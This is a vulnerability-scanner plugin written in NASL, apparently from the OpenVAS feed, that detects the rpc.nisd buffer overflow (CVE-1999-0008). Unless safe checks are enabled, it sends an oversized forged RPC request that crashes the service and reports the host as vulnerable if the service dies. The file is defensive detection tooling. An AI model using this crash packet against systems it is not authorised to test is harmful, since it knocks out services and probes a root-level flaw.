# SPDX-FileCopyrightText: 2008 Renaud Deraison
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80029");
  script_version("2023-09-08T05:06:21+0000");
  script_tag(name:"last_modification", value:"2023-09-08 05:06:21 +0000 (Fri, 08 Sep 2023)");
  script_tag(name:"creation_date", value:"2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/104");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-1999-0008");
  script_name("rpc.nisd overflow");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2008 Renaud Deraison");
  script_family("Gain a shell remotely");
  script_dependencies("gb_rpc_portmap_udp_detect.nasl", "gather-package-list.nasl");
  script_mandatory_keys("rpc/portmap/udp/detected");

  script_tag(name:"solution", value:"Disable this service if you don't use it, or apply the relevant patch.");

  script_tag(name:"summary", value:"The remote RPC service 100300 (nisd) is vulnerable
  to a buffer overflow which allows any user to obtain a root shell on this host.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("rpc.inc");
include("byte_func.inc");
include("solaris.inc");

version = get_ssh_solosversion();
if( version && ereg(pattern:"^5\.([7-9]|10)", string:version)) exit(0);

function ping(port)
{
  req =  raw_string(0x3A, 0x90, 0x9C, 0x2F, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
                    0x87, 0xCC, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
                    0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x04) + crap(4);
  soc = open_sock_udp(port);
  if(!soc)exit(0);
  send(socket:soc, data:req);
  r = recv(socket:soc, length:512);
  if(r)
    return 1;
  else
   return 0;
}

port = rpc_get_port(program:100300, protocol:IPPROTO_UDP);
if(port)
{
  if(safe_checks())
  {
    data = " The remote RPC service 100300 (nisd) *may* be vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.

*** The scanner did not actually check for this flaw, so this might be a false positive";
    security_message(port:port, data:data, proto:"udp");
    exit(0);
  }


  if(get_udp_port_state(port))
  {
    if(ping(port:port))
    {
      soc = open_sock_udp(port);
      if(soc)
      {
        # nb: We forge a bogus RPC request, with a way too long argument. The remote process will die immediately, and hopefully painlessly.
        req = raw_string(0x3A, 0x90, 0x9C, 0x2F, 0x00, 0x00,
                         0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
                         0x87, 0xCC, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
                         0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                         0x00, 0x00, 0x00, 0x00, 0x09, 0x2C) + crap(3500);

        send(socket:soc, data:req);
        r = recv(socket:soc, length:4096);
        close(soc);
        if(!ping(port:port))
          security_message(port:port, proto:"udp");
      }
    }
  }
}

exit( 0 );
